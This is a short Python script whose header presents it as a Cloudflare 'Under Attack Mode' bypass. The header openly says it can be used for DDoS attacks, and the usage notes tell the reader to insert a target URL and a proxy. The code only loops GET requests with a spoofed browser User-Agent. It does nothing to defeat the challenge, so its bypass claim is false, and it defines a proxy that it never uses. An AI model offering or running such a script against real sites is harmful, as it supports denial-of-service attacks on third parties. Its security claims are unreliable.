"""
# Script for Layer 7 UAM Bypass with Logging

This script simulates requests to bypass Cloudflare's Layer 7 "Under Attack Mode" (UAM).
It repeatedly sends requests to a target URL to mimic legitimate traffic.

## Why This File Bypasses Cloudflare Security:
1. **Layer 7 UAM Bypass**:
   - This method involves sending requests that mimic real user interactions, bypassing Cloudflare's UAM protections.
   - By continuously sending these requests, it can also be used to perform DDoS attacks.

## Usage:
- Replace the `url` variable with the target URL.
- Optional: Configure the `proxy` variable if needed.
- Ensure `requests` is installed: `pip install requests`.

## Code:
"""

import requests
import time
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def bypass_uam(url, duration, proxy=None):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            if proxy:
                response = requests.get(url, headers=headers, proxies={'http': proxy, 'https': proxy})
            else:
                response = requests.get(url, headers=headers)

            logging.info(f'Request sent. Status Code: {response.status_code}')
        except requests.RequestException as e:
            logging.error(f'Request Failed: {e}')

        time.sleep(1)


if __name__ == '__main__':
    url = "TARGET SITE"
    duration = 60
    proxy = "YOUR PROXY:PORT"

    bypass_uam(url, duration)
